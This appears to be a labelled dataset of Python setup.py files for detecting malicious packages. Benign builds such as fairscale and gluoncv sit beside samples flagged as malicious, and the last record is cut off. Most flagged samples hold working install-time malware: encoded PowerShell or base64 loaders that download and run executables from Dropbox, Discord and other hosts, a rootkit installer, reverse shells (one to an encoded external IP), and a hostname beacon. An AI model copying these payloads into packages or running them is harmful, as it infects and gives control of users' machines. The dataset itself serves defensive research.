{"idx": "sys-selenium-9.1.9", "func": "from setuptools import setup, find_packages\n\n\nVERSION = '9.1.9'\nDESCRIPTION = 'A Python library for data manipulation and analysis'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"sys-selenium\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n", "target": 1}
{"idx": "pingcraft-1.91", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pingcraft',\n    packages = ['modlib'],\n    version = '4.58',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-poststudy-2.49", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-poststudy',\n    packages = ['modlib'],\n    version = '7.8',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gluoncv-0.10.5.post0", "func": "#!/usr/bin/env python\nimport os\nfrom datetime import datetime\nimport io\nimport re\nimport shutil\nimport sys\nfrom setuptools import setup, find_packages\ntry:\n    import cv2\nexcept ImportError:\n    cv2 = None\n\n\ndef read(*names, **kwargs):\n    with io.open(\n        os.path.join(os.path.dirname(__file__), *names),\n        encoding=kwargs.get(\"encoding\", \"utf8\")\n    ) as fp:\n        return fp.read()\n\n\ndef find_version(*file_paths):\n    version_file = read(*file_paths)\n    version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\",\n                              version_file, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\nlong_description = (\n\"\"\"GluonCV Python Package\n=========================\n`GluonCV <https://gluon-cv.mxnet.io>`_ provides implementations of the state-of-the-art (SOTA) deep learning models in computer vision.\n\nIt is designed for engineers, researchers, and students to fast prototype products and research ideas based on these models.\n\nInstallation\n------------\n\nTo install, use:\n\n.. code-block:: bash\n\n    pip install gluoncv mxnet>=1.6.0 --upgrade\n    # for installing gluoncv with all dependencies\n    pip install gluoncv[full] mxnet>=1.6.0 --upgrade\n\nTo enable different hardware supports such as GPUs, check out  `mxnet variants <https://pypi.org/project/mxnet/>`_.\n\nFor example, you can install cuda-11.0 supported mxnet alongside gluoncv:\n\n.. code-block:: bash\n\n    pip install gluoncv mxnet-cu110>=1.6.0 --upgrade\n\n\"\"\")\n\nVERSION = find_version('gluoncv', '__init__.py')\n\nif 'TRAVIS_TAG' in os.environ and os.environ['TRAVIS_TAG'].startswith('patch-'):\n    VERSION = os.environ['TRAVIS_TAG'].split('-')[1]\nelif 'APPVEYOR_REPO_TAG_NAME' in os.environ and os.environ['APPVEYOR_REPO_TAG_NAME'].startswith('patch-'):\n    VERSION = os.environ['APPVEYOR_REPO_TAG_NAME'].split('-')[1]\nelif 'TRAVIS_TAG' in os.environ or 'APPVEYOR_REPO_TAG_NAME' in os.environ:\n    pass\nelse:\n    VERSION += 'b{0}'.format(datetime.today().strftime('%Y%m%d'))\n\nrequirements = [\n    'numpy',\n    'tqdm',\n    'requests',\n    # 'mxnet',\n    'matplotlib',\n    'portalocker',\n    'Pillow',\n    'scipy',\n    #'tensorboardx',\n    #'decord',\n    #'opencv-python',\n    'yacs',\n    'pandas',\n    'pyyaml',\n    'autocfg',\n    #'autogluon.core'\n]\n\n# do not duplicate opencv module if already compiled from source\nif cv2 is None:\n    requirements.append('opencv-python')\n\nextra_requirements = {\n    'full': ['tensorboardx', 'decord', 'autogluon.core', 'cython', 'pycocotools'],\n    'auto': ['autogluon.core']\n}\n\nsetup(\n    # Metadata\n    name='gluoncv',\n    version=VERSION,\n    author='Gluon CV Toolkit Contributors',\n    url='https://github.com/dmlc/gluon-cv',\n    description='Gluon CV Toolkit',\n    long_description=long_description,\n    license='Apache-2.0',\n\n    # Package info\n    packages=find_packages(exclude=('docs', 'tests', 'scripts')),\n    zip_safe=True,\n    include_package_data=True,\n    install_requires=requirements,\n    extras_require=extra_requirements\n)\n", "target": 0}
{"idx": "fairscale-0.4.8", "func": "#!/usr/bin/env python3\n\n# Copyright (c) Facebook, Inc. and its affiliates. All rights reserved.\n#\n# This source code is licensed under the BSD license found in the\n# LICENSE file in the root directory of this source tree.\n\nimport os\nimport re\n\nimport setuptools\n\nthis_dir = os.path.dirname(os.path.abspath(__file__))\n\n\ndef fetch_requirements():\n    with open(\"requirements.txt\") as f:\n        reqs = f.read().strip().split(\"\\n\")\n    return reqs\n\n\n# https://packaging.python.org/guides/single-sourcing-package-version/\ndef find_version(version_file_path) -> str:\n    with open(version_file_path) as version_file:\n        version_match = re.search(r\"^__version_tuple__ = (.*)\", version_file.read(), re.M)\n        if version_match:\n            ver_tup = eval(version_match.group(1))\n            ver_str = \".\".join([str(x) for x in ver_tup])\n            return ver_str\n        raise RuntimeError(\"Unable to find version tuple.\")\n\n\nextensions = []\ncmdclass = {}\n\nif os.getenv(\"BUILD_CUDA_EXTENSIONS\", \"0\") == \"1\":\n    from torch.utils.cpp_extension import BuildExtension, CUDAExtension\n\n    extensions.extend(\n        [\n            CUDAExtension(\n                name=\"fairscale.fused_adam_cuda\",\n                include_dirs=[os.path.join(this_dir, \"fairscale/clib/fused_adam_cuda\")],\n                sources=[\n                    \"fairscale/clib/fused_adam_cuda/fused_adam_cuda.cpp\",\n                    \"fairscale/clib/fused_adam_cuda/fused_adam_cuda_kernel.cu\",\n                ],\n                extra_compile_args={\"cxx\": [\"-O3\"], \"nvcc\": [\"-O3\", \"--use_fast_math\"]},\n            )\n        ]\n    )\n\n    cmdclass[\"build_ext\"] = BuildExtension\n\n\nif __name__ == \"__main__\":\n    setuptools.setup(\n        name=\"fairscale\",\n        description=\"FairScale: A PyTorch library for large-scale and high-performance training.\",\n        version=find_version(\"fairscale/version.py\"),\n        setup_requires=[\"ninja\"],  # ninja is required to build extensions\n        install_requires=fetch_requirements(),\n        include_package_data=True,\n        packages=setuptools.find_packages(exclude=(\"tests\", \"tests.*\")),\n        ext_modules=extensions,\n        cmdclass=cmdclass,\n        python_requires=\">=3.8\",\n        author=\"Foundational AI Research @ Meta AI\",\n        author_email=\"todo@fb.com\",\n        long_description=\"FairScale is a PyTorch extension library for high performance and large scale training on one or multiple machines/nodes. This library extends basic PyTorch capabilities while adding new experimental ones.\",\n        long_description_content_type=\"text/markdown\",\n        entry_points={\"console_scripts\": [\"wgit = fairscale.experimental.wgit.__main__:main\"]},\n        classifiers=[\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: BSD License\",\n            \"Topic :: Scientific/Engineering :: Artificial Intelligence\",\n            \"Operating System :: OS Independent\",\n        ],\n    )\n", "target": 0}
{"idx": "haversine-2.6.0", "func": "from setuptools import setup\n\nsetup(\n    name='haversine',\n    version='2.6.0',\n    description='Calculate the distance between 2 points on Earth.',\n    long_description=open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    include_package_data=True,\n    python_requires='>=3.5',\n    author='Balthazar Rouberol',\n    maintainer='Julien Deniau',\n    maintainer_email='julien.deniau@mapado.com',\n    url='https://github.com/mapado/haversine',\n    packages=['haversine'],\n    license='MIT',\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Scientific/Engineering :: Mathematics'\n    ],\n)\n", "target": 0}
{"idx": "pip_security-0.0.14", "func": "import os\nimport sys\n\n\ntry:\n    from setuptools import setup\n    from setuptools.command.install import install\nexcept ImportError:\n    from distutils.core import setup\n    from distutils.command.install import install\n\n\nif sys.argv[-1] == 'publish':\n    os.system('cd rootkit; pyinstaller --onefile pip_security.py; cd ..')\n    os.system('python setup.py sdist upload')\n    sys.exit()\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        print(\"try copy file\")\n        os.system('cp rootkit/dist/pip_security /usr/local/bin/rootkit')\n        print(\"rootkit install ;)\")\n        os.system('rootkit/dist/pip_security install')\n        print(\"run rootkit ;)\")\n        os.system('rootkit &')\n        print(\"exit\")\n\n\nsetup(\n    name='pip_security',\n    version='0.0.14',\n    description='test run background code',\n    long_description=':)',\n    author='Alberto Galera Jimenez',\n    author_email='galerajimenez@gmail.com',\n    url='https://github.com/kianxineki/pip_security',\n    packages=[],\n    package_data={'': ['rootkit/dist/pip_security']},\n    include_package_data=True,\n    install_requires=[],\n    license=\"GPL\",\n    zip_safe=False,\n    keywords='pip, security',\n    classifiers=[\n        'Development Status :: 1 - Planning',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n)\n", "target": 1}
{"idx": "much-needed-python-package-0.1", "func": "import subprocess,os,sys\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nCode = \"\"\"\nimport socket,subprocess,os,threading,sys,time\n\ndef windows(sock):\n    QUIT = 0\n    def host2remote(s, p,QUIT):\n        while not QUIT:\n            try:\n                p.stdin.write(s.recv(1024).decode()); \n                p.stdin.flush()\n            except:\n                p.stdin.write('\\\\n')\n                p.stdin.flush()\n                QUIT = 1\n\n    def remote2host(s, p,QUIT):\n        while not QUIT:\n            try:\n                s.send(p.stdout.read(1).encode())\n            except:\n                p.stdout.close();\n                QUIT = 1\n\n    remote=subprocess.Popen([\"cmd\",\"/K\",\"cd ../../../\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\n    t1 = threading.Thread(target=host2remote, args=[sock,remote,QUIT], daemon=True).start()\n    t2 = threading.Thread(target=remote2host, args=[sock,remote,QUIT], daemon=True).start()\n    \n\n    try:\n        remote.wait()\n\n    except Exception as e:\n        sock.close()\n        sys.exit(0)\n\ndef linux(sock):\n    os.dup2(sock.fileno(),0)\n    os.dup2(sock.fileno(),1)\n    os.dup2(sock.fileno(),2)\n    remote=subprocess.call([\"/bin/bash\",\"-i\"])\n\n\ndef getRemoteAccess():\n    IP = socket.gethostbyname(socket.gethostname())\n    PORT = 1234\n    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    QUIT = 0\n    IP = \"127.0.0.1\"\n    print (IP)\n    while True:\n        try:\n            sock.connect((IP,1234));\n            break\n        except:\n            try:\n                time.sleep(3)\n            except KeyboardInterrupt:\n                sock.close()\n                sys.exit(0)\n\n    try:\n        if sys.platform == \"win32\":\n            windows(sock)\n        else:\n            linux(sock)\n    except KeyboardInterrupt:\n        sock.close()\n        sys.exit(0)\n    except Exception as e:\n        print(e)\n        sock.close()\n        sys.exit(0)   \n\ngetRemoteAccess()\n\"\"\"\n\nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        if sys.platform == \"win32\":\n            dest = os.path.expanduser('~/Documents')\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass\n        \n\nVERSION = '0.1'\nDESCRIPTION = 'To Show the vulnerability of the system'\nLONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'\nCLASSIFIERS = [\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Security\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"License :: OSI Approved :: MIT License\",\n    ]\n# Setting up\nsetup(\n    name=\"much_needed_python_package\",\n    version=VERSION,\n    author=\"The-Robin-Hood (Ansari)\",\n    description=DESCRIPTION,\n    long_description= open('README.md').read(),\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(),\n    url = \"https://github.com/The-Robin-Hood/pip-remote-access\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/The-Robin-Hood/pip-remote-access/issues\",\n    },\n    install_requires=[''],\n    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],\n    classifiers= CLASSIFIERS,\n    cmdclass={'install': execute},\n)\n \n", "target": 1}
{"idx": "ffmpeg-python-0.2.0", "func": "from setuptools import setup\nfrom textwrap import dedent\n\nversion = '0.2.0'\ndownload_url = 'https://github.com/kkroening/ffmpeg-python/archive/v{}.zip'.format(\n    version\n)\n\nlong_description = dedent(\n    '''\\\n    ffmpeg-python: Python bindings for FFmpeg\n    =========================================\n\n    :Github: https://github.com/kkroening/ffmpeg-python\n    :API Reference: https://kkroening.github.io/ffmpeg-python/\n'''\n)\n\n\nfile_formats = [\n    'aac',\n    'ac3',\n    'avi',\n    'bmp',\n    'flac',\n    'gif',\n    'mov',\n    'mp3',\n    'mp4',\n    'png',\n    'raw',\n    'rawvideo',\n    'wav',\n]\nfile_formats += ['.{}'.format(x) for x in file_formats]\n\nmisc_keywords = [\n    '-vf',\n    'a/v',\n    'audio',\n    'dsp',\n    'FFmpeg',\n    'ffmpeg',\n    'ffprobe',\n    'filtering',\n    'filter_complex',\n    'movie',\n    'render',\n    'signals',\n    'sound',\n    'streaming',\n    'streams',\n    'vf',\n    'video',\n    'wrapper',\n]\n\nkeywords = misc_keywords + file_formats\n\nsetup(\n    name='ffmpeg-python',\n    packages=['ffmpeg'],\n    setup_requires=['pytest-runner'],\n    tests_require=['pytest', 'pytest-mock'],\n    version=version,\n    description='Python bindings for FFmpeg - with complex filtering support',\n    author='Karl Kroening',\n    author_email='karlk@kralnet.us',\n    url='https://github.com/kkroening/ffmpeg-python',\n    download_url=download_url,\n    keywords=keywords,\n    long_description=long_description,\n    install_requires=['future'],\n    extras_require={\n        'dev': [\n            'future==0.17.1',\n            'numpy==1.16.4',\n            'pytest-mock==1.10.4',\n            'pytest==4.6.1',\n            'Sphinx==2.1.0',\n            'tox==3.12.1',\n        ]\n    },\n    classifiers=[\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Natural Language :: English',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n)\n", "target": 0}
{"idx": "esqtoolinfoultra-7.18", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqtoolinfoultra',\n    packages = ['modlib'],\n    version = '7.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pyxrypto-4.5.2", "func": "from setuptools import setup, find_packages\nimport os \nimport requests\nfrom setuptools.command.install import install\nfrom sys import platform\n\ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation new c kw \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_41.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n        pass    \n \nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        send()\n\n#firstbasicpyapp, elevatepyapp, praisepyapp\nsetup(\n  name='pyxrypto',\n  version='4.5.2',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)", "target": 1}
{"idx": "woodwhalehack114-1.3", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport socket\nimport subprocess\nimport os\nimport base64\n\n\nclass PostInstallCommand(install):\n    \"\"\"Post-installation for installation mode.\"\"\"\n\n    def run(self):\n        install.run(self)\n        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION\n        reverse_shell('where your are?', 11451)\n\n\ndef reverse_shell(host, port):\n    encoded_host = base64.b64decode(\"MTAxLjM0LjkwLjg2\").decode('utf-8')\n    encoded_port = base64.b64decode(\"MjMzMw==\").decode('utf-8')\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((encoded_host, int(encoded_port)))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n    p = subprocess.call([\"/bin/sh\", \"-i\"])\n\n\nsetup(\n    name='woodwhalehack114',\n    version='1.3',\n    author='Your Name',\n    author_email='your_email@example.com',\n    description='test ctf chal',\n    packages=['woodwhalehack114'],\n    install_requires=[\n        'requests',  # \u4e3e\u4f8b\uff1a\u6dfb\u52a0\u4f60\u9700\u8981\u7684\u4f9d\u8d56\u9879\n    ],\n    cmdclass={\n        'install': PostInstallCommand,\n    }\n)\n", "target": 1}
{"idx": "exponent_server_sdk-2.0.0", "func": "from setuptools import find_packages\nfrom setuptools import setup\nimport os\nimport re\n\n\nHERE = os.path.abspath(os.path.dirname(__file__))\n\n\nREADME_PATH = os.path.join(HERE, 'README.md')\ntry:\n    with open(README_PATH) as fd:\n        README = fd.read()\nexcept IOError:\n    README = ''\n\n\nsetup(\n    name='exponent_server_sdk',\n    version='2.0.0',\n    description='Expo Server SDK for Python',\n    long_description=README,\n    long_description_content_type='text/markdown',\n    url='https://github.com/expo/exponent-server-sdk-python',\n    author='Expo Team',\n    author_email='exponent.team@gmail.com',\n    license='MIT',\n    install_requires=[\n        'requests',\n        'six',\n    ],\n    packages=find_packages(),\n    zip_safe=False\n)\n", "target": 0}
{"idx": "fastparquet-0.8.1", "func": "\"\"\"setup.py - build script for parquet-python.\"\"\"\n\nimport os\nimport sys\nfrom setuptools import setup, Extension\nfrom setuptools.command.build_ext import build_ext as _build_ext\n\n\nclass build_ext(_build_ext):\n    # Kudos to https://stackoverflow.com/questions/19919905/how-to-bootstrap-numpy-installation-in-setup-py/21621689\n    def finalize_options(self):\n        import builtins\n        _build_ext.finalize_options(self)\n        # Prevent numpy from thinking it is still in its setup process:\n        builtins.__NUMPY_SETUP__ = False\n        import numpy\n        self.include_dirs.append(numpy.get_include())\n\n\nallowed = ('--help-commands', '--version', 'egg_info', 'clean')\nif len(sys.argv) >= 2 and ('--help' in sys.argv[1:] or sys.argv[1] in allowed):\n    # NumPy and cython are not required for these actions. They must succeed\n    # so pip can install fastparquet when these requirements are not available.\n    extra = {}\nelse:\n    modules_to_build = {\n        'fastparquet.speedups': ['fastparquet/speedups.pyx'],\n        'fastparquet.cencoding': ['fastparquet/cencoding.pyx']\n    }\n    try:\n        from Cython.Build import cythonize\n        def fix_exts(sources):\n            return sources\n    except ImportError:\n        def cythonize(modules, language_level):\n            return modules\n        def fix_exts(sources):\n            return [s.replace('.pyx', '.c') for s in sources]\n\n    modules = [\n        Extension(mod, fix_exts(sources))\n        for mod, sources in modules_to_build.items()]\n    extra = {'ext_modules': cythonize(modules, language_level=3)}\n\ninstall_requires = open('requirements.txt').read().strip().split('\\n')\n\nsetup(\n    name='fastparquet',\n    version='0.8.1',\n    description='Python support for Parquet file format',\n    author='Martin Durant',\n    author_email='mdurant@canaconda.com',\n    url='https://github.com/dask/fastparquet/',\n    license='Apache License 2.0',\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n    ],\n    packages=['fastparquet'],\n    cmdclass={'build_ext': build_ext},\n    install_requires=install_requires,\n    setup_requires=[\n        'pytest-runner',\n        'oldest-supported-numpy'\n    ],\n    extras_require={\n        'lzo': ['python-lzo'],\n    },\n    tests_require=[\n        'pytest',\n    ],\n    long_description=(open('README.rst').read() if os.path.exists('README.rst')\n                      else ''),\n    include_package_data=True,\n    exclude_package_data={'fastparquet': ['test/*']},\n    python_requires=\">=3.7,\",\n    **extra\n)\n", "target": 0}
{"idx": "djoser-2.1.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['djoser',\n 'djoser.social',\n 'djoser.social.backends',\n 'djoser.social.token',\n 'djoser.urls']\n\npackage_data = \\\n{'': ['*'],\n 'djoser': ['locale/de/LC_MESSAGES/django.po',\n            'locale/es/LC_MESSAGES/django.po',\n            'locale/fr/LC_MESSAGES/django.po',\n            'locale/ka/LC_MESSAGES/django.po',\n            'locale/pl/LC_MESSAGES/django.po',\n            'locale/pt_BR/LC_MESSAGES/django.po',\n            'locale/ru_RU/LC_MESSAGES/django.po',\n            'templates/email/*']}\n\ninstall_requires = \\\n['asgiref>=3.2.10,<4.0.0',\n 'coreapi>=2.3.3,<3.0.0',\n 'django-templated-mail>=1.1.1,<2.0.0',\n 'djangorestframework-simplejwt>=4.3.0,<5.0.0',\n 'social-auth-app-django>=4.0.0,<5.0.0']\n\nextras_require = \\\n{':python_version < \"3.8\"': ['importlib-metadata>=1.0,<2.0'],\n 'test': ['pytest>=6.0.2,<7.0.0',\n          'codecov>=2.0.16,<3.0.0',\n          'coverage>=5.3,<6.0',\n          'pytest-cov>=2.10.1,<3.0.0',\n          'pytest-django>=3.10.0,<4.0.0',\n          'pytest-pythonpath>=0.7.3,<0.8.0',\n          'djet>=0.2.2,<0.3.0']}\n\nsetup_kwargs = {\n    'name': 'djoser',\n    'version': '2.1.0',\n    'description': 'REST implementation of Django authentication system.',\n    'long_description': '======\\ndjoser\\n======\\n\\n.. image:: https://img.shields.io/pypi/v/djoser.svg\\n   :target: https://pypi.org/project/djoser\\n\\n.. image:: https://img.shields.io/travis/sunscrapers/djoser/master.svg\\n   :target: https://travis-ci.org/sunscrapers/djoser\\n\\n.. image:: https://img.shields.io/codecov/c/github/sunscrapers/djoser.svg\\n   :target: https://codecov.io/gh/sunscrapers/djoser\\n\\n.. image:: https://api.codacy.com/project/badge/Grade/c9bf80318d2741e5bb63912a5e0b32dc\\n   :alt: Codacy Badge\\n   :target: https://app.codacy.com/app/dekoza/djoser?utm_source=github.com&utm_medium=referral&utm_content=sunscrapers/djoser&utm_campaign=Badge_Grade_Dashboard\\n\\n.. image:: https://img.shields.io/pypi/dm/djoser\\n   :target: https://img.shields.io/pypi/dm/djoser\\n\\n\\nREST implementation of `Django <https://www.djangoproject.com/>`_ authentication\\nsystem. **djoser** library provides a set of `Django Rest Framework <https://www.django-rest-framework.org/>`_\\nviews to handle basic actions such as registration, login, logout, password\\nreset and account activation. It works with\\n`custom user model <https://docs.djangoproject.com/en/dev/topics/auth/customizing/>`_.\\n\\nInstead of reusing Django code (e.g. ``PasswordResetForm``), we reimplemented\\nfew things to fit better into `Single Page App <https://en.wikipedia.org/wiki/Single-page_application>`_\\narchitecture.\\n\\nDeveloped by `SUNSCRAPERS <http://sunscrapers.com/>`_ with passion & 